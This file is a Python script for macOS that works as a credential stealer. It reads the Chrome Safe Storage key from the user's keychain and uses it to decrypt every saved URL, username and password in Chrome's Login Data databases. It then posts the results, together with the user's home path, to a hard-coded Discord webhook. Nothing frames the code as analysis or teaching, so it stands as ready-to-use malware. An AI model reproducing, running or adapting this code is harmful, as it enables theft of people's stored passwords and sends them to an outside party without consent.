import sqlite3, os, binascii, subprocess, base64, sys, hashlib, glob
loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Profile*/Login Data" % os.path.expanduser("~"))
if len(loginData) == 0:
    loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Default/Login Data" % os.path.expanduser("~")) #attempt default profile
safeStorageKey = subprocess.check_output("security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'", shell=True).replace("\n", "").replace("\"", "")
if safeStorageKey == "":
    print("ERROR getting Chrome Safe Storage Key")
    sys.exit()

def chromeDecrypt(encrypted_value, iv, key=None): #AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
    hexKey = binascii.hexlify(key)
    hexEncPassword = base64.b64encode(encrypted_value[3:])
    try: #send any error messages to /dev/null to prevent screen bloating up
        decrypted = subprocess.check_output("openssl enc -base64 -d -aes-128-cbc -iv '%s' -K %s <<< %s 2>/dev/null" % (iv, hexKey, hexEncPassword), shell=True)
    except Exception as e:
        decrypted = "ERROR retrieving password"
    return decrypted

def chromeProcess(safeStorageKey, loginData):
    iv = ''.join(('20',) * 16) #salt, iterations, iv, size - https://cs.chromium.org/chromium/src/components/os_crypt/os_crypt_mac.mm
    key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]
    fd = os.open(loginData, os.O_RDONLY) #open as read only
    database = sqlite3.connect('/dev/fd/%d' % fd)
    os.close(fd)
    sql = 'select username_value, password_value, origin_url from logins'
    decryptedList = []
    with database:
        for user, encryptedPass, url in database.execute(sql):
            if user == "" or (encryptedPass[:3] != b'v10'): #user will be empty if they have selected "never" store password
                continue
            else:
                urlUserPassDecrypted = (url.encode('ascii', 'ignore'), user.encode('ascii', 'ignore'), chromeDecrypt(encryptedPass, iv, key=key).encode('ascii', 'ignore'))
                decryptedList.append(urlUserPassDecrypted)
    return decryptedList
a = ""
for profile in loginData:
    for i, x in enumerate(chromeProcess(safeStorageKey, "%s" % profile)):
    	a += "%s[%s]%s %s%s%s\n\t%sUser%s: %s\n\t%sPass%s: %s\n-lbr-\n" % ("**", (i + 1), "**", "", x[0], "", "**", "**", x[1], "**", "**", x[2])
b = ''
for i in a[:2000].split('\n-lbr-\n')[0:-1]:
    b += '\n\n' + i
c = a.split('\n-lbr-\n')
import os
username = "test hook - " + os.path.expanduser("~")
data = {
    "content" : b,
    "username" : username
}
hdr = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
       'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
       'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
       'Accept-Encoding': 'none',
       'Accept-Language': 'en-US,en;q=0.8',
       'Connection': 'keep-alive'}
url = 'https://discord.com/api/webhooks/888501047058911313/3ivhKrqipdj4XjaUYbW8OFvVUUn5ogk9Krl4ZyUD4EL1pz6txvVr1TcP8GjBbnd_NwhK'
from urllib import urlencode
import urllib2
def http_post(url, data):
    post = urlencode(data)
    req = urllib2.Request(url, post, headers=hdr)
    response = urllib2.urlopen(req)
    return response.read()

http_post(url=url, data=data)
